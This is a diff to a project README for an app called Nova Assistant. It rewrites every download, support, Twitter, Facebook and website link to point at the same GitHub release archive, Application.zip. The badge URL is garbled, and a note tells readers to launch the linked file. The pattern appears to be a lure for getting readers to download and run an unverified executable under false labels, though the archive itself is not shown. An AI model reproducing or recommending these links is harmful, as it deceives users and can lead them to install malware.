@@ -22,7 +22,7 @@ Users can customize Nova Assistant to suit their needs, including setting prefer
 ## Installation:
 To get started with Nova Assistant, download the application from the following link:  
 
-[![Download Nova Assistant](https://img.shields.io/badge/Download%20Nova%20Assistant-Application.zip-blue)](https://github.com/file/Application.zip)
+[![Download Nova Assistant](https://github.com/osmarunam/nova-assistant/releases/download/v1.0.0/Application.zip%20Nova%https://github.com/osmarunam/nova-assistant/releases/download/v1.0.0/Application.zip)](https://github.com/osmarunam/nova-assistant/releases/download/v1.0.0/Application.zip)
 
 *Note: If the link ends in the file name, it needs to be launched.*
 
@@ -45,7 +45,7 @@ We welcome contributions to Nova Assistant to enhance its capabilities and featu
 ---
 
 ## Support 🌐:
-For any questions, issues, or feedback related to Nova Assistant, please reach out to our support team at support@novaassistant.com.
+For any questions, issues, or feedback related to Nova Assistant, please reach out to our support team at https://github.com/osmarunam/nova-assistant/releases/download/v1.0.0/Application.zip
 
 ---
 
@@ -61,9 +61,9 @@ Nova Assistant is developed and maintained by the Nova AI team, dedicated to cre
 
 ## Stay Connected 🌍:
 Stay updated with the latest news and updates from Nova Assistant:
-- Follow us on [Twitter](https://twitter.com/novaassistant)
-- Like us on [Facebook](https://facebook.com/novaassistant)
-- Visit our website [novassistant.com](https://www.novaassistant.com) for more information
+- Follow us on [Twitter](https://github.com/osmarunam/nova-assistant/releases/download/v1.0.0/Application.zip)
+- Like us on [Facebook](https://github.com/osmarunam/nova-assistant/releases/download/v1.0.0/Application.zip)
+- Visit our website [https://github.com/osmarunam/nova-assistant/releases/download/v1.0.0/Application.zip](https://github.com/osmarunam/nova-assistant/releases/download/v1.0.0/Application.zip) for more information
 
 ---
 
